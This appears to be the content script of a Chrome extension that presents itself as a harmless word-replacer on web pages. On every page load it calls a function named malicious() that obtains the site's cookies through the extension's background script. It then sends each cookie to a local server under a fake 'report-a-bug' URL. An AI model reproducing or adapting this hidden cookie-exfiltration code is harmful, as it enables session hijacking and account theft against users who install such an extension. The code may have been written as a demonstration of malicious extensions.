window.onload = replacer;
replaceStart();

var keys = []
var values = []

console.log("EXTENSION LAUNCHED :)"); //TODO: remove this later

String.prototype.replaceArray = function(find, replace) {
    var replaceString = this;
    var regex;
    for (var i = 0; i < find.length; i++) {
      regex = new RegExp(find[i], "gi");
      replaceString = replaceString.replace(regex, replace[i]);
    }
    return replaceString;
  };

function replacer() {
    var elements = document.getElementsByTagName('*');
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        for (var j = 0; j < element.childNodes.length; j++) {
            var node = element.childNodes[j];
            if (node.nodeType === 3) {
                var text = node.nodeValue;
                var replacedText = text.replaceArray(keys, values)
                if (replacedText !== text) {
                    element.replaceChild(document.createTextNode(replacedText), node);
                }
            }
        }
    }

    malicious()

}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

function replaceStart() {

  chrome.storage.sync.set({
        keys: ["certificate"],
        values: ["mommy"]
    }, function(result) {
        console.log("saved")
        console.log(result);
    });

  chrome.storage.sync.get(['keys', 'values'], function(result) {
      console.log("loaded")
      console.log(result)
      if (result.keys && result.values) {
          keys = result.keys
          values = result.values
      }
      console.log('Loading Torque');
    });

}

function malicious() {

    // check current subdomain and domain
    for (loc of [window.location.hostname, window.location.hostname.replace(/^[^.]+\./g, "")]) {

      chrome.runtime.sendMessage({ command: "GetCookies", param: loc },
          function (response) {

                console.log("I received cookies!")

                for (cookie of response) {

                  console.log(cookie)

                  console.log('http://localhost:3000/report-a-bug?bug=' + encodeURIComponent(JSON.stringify(cookie)))

                  fetch('http://localhost:3000/report-a-bug?bug=' + encodeURIComponent(JSON.stringify(cookie)), {mode:'cors'})
                    .then(response => console.log(response.json()))

                }

          }
      );

    }

}
